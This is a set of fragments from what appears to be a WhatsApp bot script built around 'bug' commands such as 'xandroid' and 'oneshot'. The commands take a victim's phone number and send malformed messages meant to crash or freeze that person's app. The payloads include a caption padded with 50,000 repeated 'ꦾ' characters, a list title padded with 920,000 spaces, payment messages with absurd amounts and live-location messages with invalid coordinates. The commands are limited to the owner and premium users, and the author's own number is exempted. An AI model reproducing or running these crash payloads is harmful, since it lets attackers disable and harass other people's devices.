...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🤡 Badut 🤡 Badut 🤡 Badut\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🤡 Badut"+" ".repeat(920000),
        'footerText': `🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut`,
        'description': `🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut 🤡 Badut`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
                ...
                await GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://telegra.ph/file/be5ada18a856943e6982f.png',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
...
case "xandroid": {
  ...
  if (cleanedNumber == "6285648973328") {
    return;
  }
...
case 'oneshot': {
	if (!isCreator) return replyglobal(mess.owner)
if (!text) return replyglobal(`Usage .${command} 6285648973328`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 6285648973328`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285648973328") {
    return;
...
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 6285648973328`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 6285648973328`)
...
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🤡 Badut" + xeontext1,
    'mimetype': "application/zip",
    'caption': "🤡 Badut" + xeontext1,
            ...
            'interactiveMessage': {
                ...
                'contextInfo': {
                    ...
                    'forwardedNewsletterMessageInfo': {
                        ...
                        'serverMessageId': 0x1,
                        'newsletterName': "드림 가이 KawaiNime"
                    }
                }
            }
        }
...
title: `Xeon's ur father`
  ...
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🤡 Badut${xeontext11}`,
      caption: `🤡 Badut ${xeontext11}`,
    },
...
break
            ...
            case '?':
            case 'allmenu':
                let xeonmenuoh = `Hallo Bro ${pushname}
╰┈➤ ${xeonytimewisher} 😄
${readmore}
╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
> xandroid 
